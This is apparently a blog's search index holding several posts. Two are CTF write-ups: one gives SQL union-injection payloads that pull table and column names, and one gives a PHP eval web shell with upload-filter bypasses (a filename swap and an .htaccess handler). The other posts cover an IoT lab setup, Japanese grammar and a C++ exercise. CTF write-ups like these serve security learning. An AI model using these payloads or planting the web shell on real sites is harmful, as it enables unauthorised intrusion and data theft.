<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>智慧教室场景的物联网攻防靶场设计</title>
    <link href="/2025/03/20/%E6%99%BA%E6%85%A7%E6%95%99%E5%AE%A4%E5%9C%BA%E6%99%AF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E6%94%BB%E9%98%B2%E9%9D%B6%E5%9C%BA%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/03/20/%E6%99%BA%E6%85%A7%E6%95%99%E5%AE%A4%E5%9C%BA%E6%99%AF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E6%94%BB%E9%98%B2%E9%9D%B6%E5%9C%BA%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>参考教程    <a href="https://mp.weixin.qq.com/s/8-eqKRYMOVPlMfFSu0Jenw">https://mp.weixin.qq.com/s/8-eqKRYMOVPlMfFSu0Jenw</a></p><p>部分与教程不同的地方如下列出</p><h1 id="部署Nginx服务器"><a href="#部署Nginx服务器" class="headerlink" title="部署Nginx服务器"></a>部署Nginx服务器</h1><h2 id="下载依赖工具"><a href="#下载依赖工具" class="headerlink" title="下载依赖工具"></a>下载依赖工具</h2><pre><code class="hljs"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install build-essential libpcre3 libpcre3-dev libssl-dev<br><br><span class="hljs-built_in">mkdir</span> nginx      <br><span class="hljs-built_in">cd</span> nginx/<br><br>wget http://nginx.org/download/nginx-1.10.3.tar.gz<br>wget http://zlib.net/zlib-1.3.1.tar.gz<br>wget https://netix.dl.sourceforge.net/project/pcre/pcre/8.40/pcre-8.40.tar.gz<br>wget https://www.openssl.org/source/openssl-1.0.2k.tar.gz<br>wget https://github.com/arut/nginx-rtmp-module/archive/master.zip<br></code></pre></td></tr></table></figure>这里由于zlib之前版本下载不了，目前只有1.3.1版本，因此下载这个版本。之后全部tar解压，nginx-rtmp-module-master是unzip解压之后的配置文件修改为<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./configure --prefix=/usr/local/nginx --with-debug --with-pcre=../pcre-8.40 --with-zlib=../zlib-1.3.1 --with-openssl=../openssl-1.0.2k --add-module=../nginx-rtmp-module-master<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/local/nginx/sbin/nginx -v<br></code></pre></td></tr></table></figure>查看版本号后得知安装成功：nginx version: nginx/1.25.3</code></pre><h1 id="挂载NTF服务器端目录"><a href="#挂载NTF服务器端目录" class="headerlink" title="挂载NTF服务器端目录"></a>挂载NTF服务器端目录</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install nfs-kernel-server ;安装NFS服务器<br><span class="hljs-built_in">sudo</span> vim /etc/exports ;编辑NFS配置文件<br><br>/home/work *(rw,no_root_squash,<span class="hljs-built_in">sync</span>,no_subtree_check,insecure)<br><br><span class="hljs-built_in">sudo</span> exportfs -a ; 应用NFS配置<br><span class="hljs-built_in">sudo</span> service nfs-kernel-server restart ;重启NFS服务<br><br><br><span class="hljs-built_in">sudo</span> mount -t nfs -o nolock 8.138.209.91:/home/work /home/sakuraq/mount/ ;挂载NFS目录<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>大创</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-Sql注入</title>
    <link href="/2025/02/24/Sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/02/24/Sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-Sql注入"><a href="#CTF-Sql注入" class="headerlink" title="CTF-Sql注入"></a>CTF-Sql注入</h1><h2 id="SWPUCTF-2021-新生赛-easy-sqlWriteUp"><a href="#SWPUCTF-2021-新生赛-easy-sqlWriteUp" class="headerlink" title="[SWPUCTF 2021 新生赛] easy_sqlWriteUp"></a>[SWPUCTF 2021 新生赛] easy_sqlWriteUp</h2><ul><li><p>从title可知参数名为wllm，先确定该数据表一共有几列，直到数据库返回null为止</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- url形式</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 5 --+</span><br><span class="hljs-string">......</span><br></code></pre></td></tr></table></figure></li><li><p>（假设完成上一步骤后，数据库只有三列）使用联合查询语句，union select后的列数必须与前面列数相同，否则会报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p>其中’–’是Sql语句通用注释符号，’+’的目的是为了代替空格保证注释生效。</p></li><li><p>根据回显结果查询数据库名称，得到数据库名为test_db</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br></code></pre></td></tr></table></figure></li><li><p>再次查询该数据库中的数据表名称，得到数据表名有test_tb,users</p><p>其中group_concat()的作用是将查询到的表名排成一行而不是分行排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure></li><li><p>查询分别查询两张数据表中的字段，发现test_tb中有flag字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_tb<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=2&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li><li><p>查询test_tb中的flag字段最终得到flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>Sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>日本語の勉強</title>
    <link href="/2025/02/24/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%92%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B/"/>
    <url>/2025/02/24/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%92%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="日本語の覚書"><a href="#日本語の覚書" class="headerlink" title="日本語の覚書"></a>日本語の覚書</h1><h2 id="形容詞変形"><a href="#形容詞変形" class="headerlink" title="形容詞変形"></a>形容詞変形</h2><table><thead><tr><th>变形形式</th><th>分类</th><th>变形规则</th><th>原形例</th><th>变形后例</th></tr></thead><tbody><tr><td><strong>否定形</strong></td><td>い形容词</td><td>い→くない</td><td>高い</td><td>高くない</td></tr><tr><td></td><td>な形容词</td><td>な→ではない&#x2F;ではありません</td><td>静かな</td><td>静かではない</td></tr><tr><td></td><td>名词</td><td>名词＋ではない&#x2F;ではありません</td><td>学生</td><td>学生ではない</td></tr><tr><td><strong>过去形</strong></td><td>い形容词</td><td>い→かった</td><td>高い</td><td>高かった</td></tr><tr><td></td><td>な形容词</td><td>な→だった&#x2F;でした</td><td>静かな</td><td>静かだった</td></tr><tr><td></td><td>名词</td><td>名词＋だった&#x2F;でした</td><td>学生</td><td>学生だった</td></tr><tr><td><strong>て形</strong></td><td>い形容词</td><td>い→くて</td><td>高い</td><td>高くて</td></tr><tr><td></td><td>な形容词</td><td>な→で</td><td>静かな</td><td>静かで</td></tr><tr><td><strong>副词形</strong></td><td>い形容词</td><td>い→く</td><td>早い</td><td>早く</td></tr><tr><td></td><td>な形容词</td><td>な→に</td><td>静かな</td><td>静かに</td></tr><tr><td><strong>假定形</strong></td><td>い形容词</td><td>い→ければ</td><td>高い</td><td>高ければ</td></tr><tr><td></td><td>な形容词</td><td>な→なら（ば）</td><td>静かな</td><td>静かなら（ば）</td></tr><tr><td></td><td>名词</td><td>名词＋なら（ば）</td><td>学生</td><td>学生なら（ば）</td></tr><tr><td><strong>礼貌形</strong></td><td>い形容词</td><td>直接加です</td><td>高い</td><td>高いです</td></tr><tr><td></td><td>な形容词</td><td>な→です</td><td>静かな</td><td>静かです</td></tr><tr><td></td><td>名词</td><td>名词＋です</td><td>学生</td><td>学生です</td></tr><tr><td><strong>过去否定</strong></td><td>い形容词</td><td>い→くなかった</td><td>高い</td><td>高くなかった</td></tr><tr><td></td><td>な形容词</td><td>な→ではなかった</td><td>静かな</td><td>静かではなかった</td></tr><tr><td></td><td>名词</td><td>名词＋ではなかった</td><td>学生</td><td>学生ではなかった</td></tr></tbody></table><p><strong>特殊注意</strong>：</p><ol><li><p><strong>いい的变形</strong>：  </p><ul><li>いい → よくない（否定形）  </li><li>いい → よかった（过去形）  </li><li>いい → よければ（假定形）</li></ul></li><li><p><strong>礼貌形变形组合</strong>：  </p><ul><li>高いです → 高くないです／高くありません（否定）  </li><li>静かです → 静かではありません／静かじゃないです（否定）  </li><li>学生です → 学生ではありません／学生じゃないです（否定）</li></ul></li><li><p><strong>口语简略形</strong>：  </p><ul><li>ではない → じゃない  </li><li>ではありません → じゃありません</li></ul></li></ol><h2 id="動詞変形（辞書形基准）"><a href="#動詞変形（辞書形基准）" class="headerlink" title="動詞変形（辞書形基准）"></a>動詞変形（辞書形基准）</h2><table><thead><tr><th>变形形式</th><th>动词分类</th><th>变形规则</th><th>辞書形例</th><th>变形后例</th></tr></thead><tbody><tr><td><strong>て形</strong></td><td>一类动词</td><td>根据词尾假名变化：<br>う&#x2F;つ&#x2F;る→って<br>む&#x2F;ぶ&#x2F;ぬ→んで<br>く→いて<br>ぐ→いで<br>す→して<br>例外：行く→行って</td><td>書く</td><td>書いて</td></tr><tr><td></td><td></td><td></td><td>急ぐ</td><td>急いで</td></tr><tr><td></td><td></td><td></td><td>話す</td><td>話して</td></tr><tr><td></td><td>二类动词</td><td>る→て</td><td>食べる</td><td>食べて</td></tr><tr><td></td><td>三类动词</td><td>する→して<br>来る→来て（きて）</td><td>勉強する</td><td>勉強して</td></tr><tr><td></td><td></td><td></td><td>来る</td><td>来て</td></tr><tr><td><strong>た形</strong></td><td>一类动词</td><td>与て形规则相同</td><td>買う</td><td>買った</td></tr><tr><td></td><td>二类动词</td><td>る→た</td><td>見る</td><td>見た</td></tr><tr><td></td><td>三类动词</td><td>する→した<br>来る→来た（きた）</td><td>旅行する</td><td>旅行した</td></tr><tr><td><strong>ない形</strong></td><td>一类动词</td><td>词尾う段→あ段＋ない</td><td>書く</td><td>書かない</td></tr><tr><td></td><td></td><td>例外：ある→ない</td><td>買う</td><td>買わない</td></tr><tr><td></td><td>二类动词</td><td>る→ない</td><td>食べる</td><td>食べない</td></tr><tr><td></td><td>三类动词</td><td>する→しない<br>来る→来ない（こない）</td><td>勉強する</td><td>勉強しない</td></tr><tr><td><strong>被动形</strong></td><td>一类动词</td><td>词尾う段→あ段＋れる</td><td>書く</td><td>書かれる</td></tr><tr><td></td><td>二类动词</td><td>る→られる</td><td>食べる</td><td>食べられる</td></tr><tr><td></td><td>三类动词</td><td>する→される<br>来る→来られる（こられる）</td><td>勉強する</td><td>勉強される</td></tr><tr><td><strong>使役形</strong></td><td>一类动词</td><td>词尾う段→あ段＋せる</td><td>書く</td><td>書かせる</td></tr><tr><td></td><td>二类动词</td><td>る→させる</td><td>食べる</td><td>食べさせる</td></tr><tr><td></td><td>三类动词</td><td>する→させる<br>来る→来させる（こさせる）</td><td>勉強する</td><td>勉強させる</td></tr><tr><td><strong>可能形</strong></td><td>一类动词</td><td>词尾う段→え段＋る</td><td>書く</td><td>書ける</td></tr><tr><td></td><td>二类动词</td><td>る→られる</td><td>食べる</td><td>食べられる</td></tr><tr><td></td><td>三类动词</td><td>する→できる<br>来る→来られる（こられる）</td><td>勉強する</td><td>勉強できる</td></tr><tr><td><strong>命令形</strong></td><td>一类动词</td><td>词尾う段→え段</td><td>書く</td><td>書け</td></tr><tr><td></td><td>二类动词</td><td>る→ろ</td><td>食べる</td><td>食べろ</td></tr><tr><td></td><td>三类动词</td><td>する→しろ<br>来る→来い（こい）</td><td>勉強する</td><td>勉強しろ</td></tr><tr><td><strong>意向形</strong></td><td>一类动词</td><td>词尾う段→お段＋う</td><td>書く</td><td>書こう</td></tr><tr><td></td><td>二类动词</td><td>る→よう</td><td>食べる</td><td>食べよう</td></tr><tr><td></td><td>三类动词</td><td>する→しよう<br>来る→来よう（こよう）</td><td>勉強する</td><td>勉強しよう</td></tr><tr><td><strong>假定形</strong></td><td>一类动词</td><td>词尾う段→え段＋ば</td><td>書く</td><td>書けば</td></tr><tr><td></td><td>二类动词</td><td>る→れば</td><td>食べる</td><td>食べれば</td></tr><tr><td></td><td>三类动词</td><td>する→すれば<br>来る→来れば（くれば）</td><td>勉強する</td><td>勉強すれば</td></tr><tr><td><strong>禁止形</strong></td><td>全分类</td><td>辞書形＋な</td><td>書く</td><td>書くな</td></tr><tr><td></td><td></td><td></td><td>食べる</td><td>食べるな</td></tr><tr><td></td><td></td><td></td><td>勉強する</td><td>勉強するな</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>日本語</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日本語</tag>
      
      <tag>勉強します</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UpLoad漏洞 WP</title>
    <link href="/2025/02/23/CTF-UpLoad%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/23/CTF-UpLoad%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-UpLoad"><a href="#CTF-UpLoad" class="headerlink" title="CTF-UpLoad"></a>CTF-UpLoad</h1><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><h3 id="1-0版本"><a href="#1-0版本" class="headerlink" title="1.0版本"></a>1.0版本</h3><p>​创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>​修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filename&#x3D;”test.php”，转发后即可上传。</p><p>​用中国蚁剑链接，填入url&#x2F;upload&#x2F;test.php，密码为ctf，即可入侵后台拿到flag。</p><h3 id="2-0版本"><a href="#2-0版本" class="headerlink" title="2.0版本"></a>2.0版本</h3><p>​2.0版本新增了后端php文件类型检测，因此需将文件后缀名改为.phptml后重复1.0版本即可。</p><h3 id="3-0版本"><a href="#3-0版本" class="headerlink" title="3.0版本"></a>3.0版本</h3><pre><code class="hljs"> 3.0版本新增后端php、phptml等等可用于php语言解析的文件后缀名检测，因此，需使用用于Apache Web服务器配置相关指令的.htaccess文件进行绕过。.htaccess文件中写入:</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;test.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>可以在服务器端自动将test.jpg文件按照php文件来解析，达到绕过目的，最终拿到Flag。</p><p>​</p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>UpLoad</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HelloWorld</title>
    <link href="/2025/02/11/HelloWorld/"/>
    <url>/2025/02/11/HelloWorld/</url>
    
    <content type="html"><![CDATA[<h1 id="记录我的博客第一条帖子"><a href="#记录我的博客第一条帖子" class="headerlink" title="记录我的博客第一条帖子"></a>记录我的博客第一条帖子</h1><h2 id="Start-now"><a href="#Start-now" class="headerlink" title="Start now"></a>Start now</h2><p>​花了一下午时间搭建好了博客网站，感觉还挺有成就感的，以后就作为笔记收录处以及日常生活分享处吧。</p>]]></content>
    
    
    <categories>
      
      <category>生活日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>c++</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<h1 id="经典cpp题目积累"><a href="#经典cpp题目积累" class="headerlink" title="经典cpp题目积累"></a>经典cpp题目积累</h1><h2 id="统计字符的出现次数"><a href="#统计字符的出现次数" class="headerlink" title="统计字符的出现次数"></a>统计字符的出现次数</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>输入字符串，字符串由英文字母、数字、标点符号和运算符号组成 (不含空格)。统计每个字符在该字符串中出现次数，按出现次数从大到小的顺序，将字符和其出现次数输出。如果存在出现次数相等的字符，ASCII码值较大的字符排在前面。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入一个字符串（ASCII范围：[33, 126]），字符串长度最多为1000。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>按字符出现次数的排序，输出字符和其出现次数，两者之间用冒号隔开。</p><h3 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例 1"></a>输入样例 1</h3><p>HelloWorld!<br>XMU:(1+2)*9&#x3D;27</p><h3 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例 1"></a>输出样例 1</h3><p>l:3 o:2 r:1 e:1 d:1 W:1 H:1 !:1<br>2:2 X:1 U:1 M:1 &#x3D;:1 ::1 9:1 7:1 1:1 +:1 *:1 ):1 (:1 </p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先看到题目想到桶排。写一个简单的compare函数，sort排序。利用STL库，用pair存储字符和出现次数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">// &#x27;&gt;&#x27; 按降序排列，&#x27;&lt;&#x27; 按升序排列</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">compare</span><span class="hljs-params">(pair&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt;&amp; a, pair&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt;&amp; b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(a.second != b.second)<span class="hljs-keyword">return</span> a.second &gt; b.second;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> a.first &gt; b.first;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    string s;<br>    <span class="hljs-keyword">while</span>(cin &gt;&gt; s)&#123;<br>        <span class="hljs-type">int</span> freq[<span class="hljs-number">127</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c : s)&#123;<br>        freq[c]++;<br>&#125;<br>            <br>        <br>        vector&lt;pair&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt;&gt; charFreq;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">33</span>; i &lt;= <span class="hljs-number">126</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (freq[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">//static_cast&lt;char&gt;将int类型转换为char类型</span><br>                charFreq.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">make_pair</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">char</span>&gt;(i), freq[i]));<br>                <br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">sort</span>(charFreq.<span class="hljs-built_in">begin</span>(),charFreq.<span class="hljs-built_in">end</span>(),compare);<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> p : charFreq)&#123;<br>            cout &lt;&lt; p.first &lt;&lt; <span class="hljs-string">&quot;:&quot;</span> &lt;&lt; p.second &lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
  </entry>
  
  
  
</search>
